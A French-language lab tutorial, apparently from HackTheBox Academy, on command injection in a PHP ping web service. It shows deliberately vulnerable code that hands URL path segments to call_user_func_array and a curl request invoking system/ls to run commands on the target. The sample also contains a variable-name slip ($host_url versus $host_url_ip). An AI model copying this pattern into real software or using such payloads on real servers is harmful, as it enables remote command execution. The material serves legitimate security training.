Injection de commandes
======================

* * * * *

Les injections de commandes font partie des vulnérabilités les plus critiques des services Web. Ils permettent l'exécution de commandes système directement sur le serveur principal. Si un service Web utilise une entrée contrôlée par l'utilisateur pour exécuter une commande système sur le serveur principal, un attaquant peut être en mesure d'injecter une charge utile malveillante pour subvertir la commande prévue et exécuter la sienne.

Évaluons ensemble un service web vulnérable à l'injection de commandes.

Vous avez peut-être rencontré des services Web de vérification de la connectivité dans les panneaux d'administration du routeur ou même des sites Web qui exécutent simplement une commande ping vers un site Web de votre choix.

Supposons que nous évaluons un tel service de vérification de connectivité résidant dans `http://<TARGET IP>:3003/ping-server.php/ping`. Supposons que nous ayons également reçu le code source du service.

Remarque : Le service Web que nous sommes sur le point d'évaluer ne suit pas les conceptions/approches architecturales de service Web que nous avons couvertes. Cependant, il est assez proche d'un service Web normal, car il fournit ses fonctionnalités de manière programmatique et différents clients peuvent l'utiliser à des fins de vérification de la connectivité.

Code : php

```
<?php
function ping($host_url_ip, $packets) {
        if (!in_array($packets, array(1, 2, 3, 4))) {
                die('Only 1-4 packets!');
        }
        $cmd = "ping -c" . $packets . " " . escapeshellarg($host_url);
        $delimiter = "\n" . str_repeat('-', 50) . "\n";
        echo $delimiter . implode($delimiter, array("Command:", $cmd, "Returned:", shell_exec($cmd)));
}

if ($_SERVER['REQUEST_METHOD'] === 'GET') {
        $prt = explode('/', $_SERVER['PATH_INFO']);
        call_user_func_array($prt[1], array_slice($prt, 2));
}
?>

```

-   Une fonction appelée *ping* est définie, qui prend deux arguments *host_url_ip* et *packets* . La requête doit ressembler à ce qui suit. `http://<TARGET IP>:3003/ping-server.php/ping/<VPN/TUN Adapter IP>/3`. Pour vérifier que le service Web envoie des requêtes ping, exécutez ce qui suit sur votre machine attaquante, puis émettez la requête.
    -   ```
        dsgsec@htb[/htb]$ sudo tcpdump -i tun0 icmp
         tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
         listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
         11:10:22.521853 IP 10.129.202.133 > 10.10.14.222: ICMP echo request, id 1, seq 1, length 64
         11:10:22.521885 IP 10.10.14.222 > 10.129.202.133: ICMP echo reply, id 1, seq 1, length 64
         11:10:23.522744 IP 10.129.202.133 > 10.10.14.222: ICMP echo request, id 1, seq 2, length 64
         11:10:23.522781 IP 10.10.14.222 > 10.129.202.133: ICMP echo reply, id 1, seq 2, length 64
         11:10:24.523726 IP 10.129.202.133 > 10.10.14.222: ICMP echo request, id 1, seq 3, length 64
         11:10:24.523758 IP 10.10.14.222 > 10.129.202.133: ICMP echo reply, id 1, seq 3, length 64

        ```

-   Le code vérifie également si la valeur des *paquets* est supérieure à 4, et il le fait via un tableau. Donc, si nous émettons une requête telle que `http://<TARGET IP>:3003/ping-server.php/ping/<VPN/TUN Adapter IP>/3333`, nous n'obtiendrons *que 1 à 4 paquets ! *erreur.
-   Une variable appelée *cmd* est alors créée, qui forme la commande ping à exécuter. Deux valeurs sont "parsées", *packets* et *host_url* . [escapeshellarg()](https://www.php.net/manual/en/function.escapeshellarg.php) est utilisé pour échapper la valeur de *host_url . *Selon la référence de fonction de PHP, *escapeshellarg() ajoute des guillemets simples autour d'une chaîne et cite/échappe tous les guillemets simples existants, ce qui vous permet de passer une chaîne directement à une fonction shell et de la traiter comme un seul argument sûr. Cette fonction doit être utilisée pour échapper des arguments individuels aux fonctions shell provenant de l'entrée de l'utilisateur. Les fonctions shell incluent exec(), system() shell_exec() et l'opérateur backtick. *Si le *host_url*n'a pas été échappée, ce qui suit pourrait se produire. ![image](https://academy.hackthebox.com/storage/modules/160/1.png)
-   La commande spécifiée par le paramètre *cmd* est exécutée à l'aide de la fonction PHP *shell_exec()* .
-   Si la méthode de requête est GET, une fonction existante peut être appelée à l'aide de [call_user_func_array()](https://www.php.net/manual/en/function.call-user-func-array.php) . La fonction *call_user_func_array()* est une manière spéciale d'appeler une fonction PHP existante. Il prend une fonction à appeler comme premier paramètre, puis prend un tableau de paramètres comme second paramètre. Cela signifie qu'au lieu d' `http://<TARGET IP>:3003/ping-server.php/ping/www.example.com/3`un attaquant pourrait émettre une demande comme suit. `http://<TARGET IP>:3003/ping-server.php/system/ls`. Ceci constitue une vulnérabilité d'injection de commande !

Vous pouvez tester la vulnérabilité d'injection de commande comme suit.

```
dsgsec@htb[/htb]$ curl http://<TARGET IP>:3003/ping-server.php/system/ls
index.php
ping-server.php
```
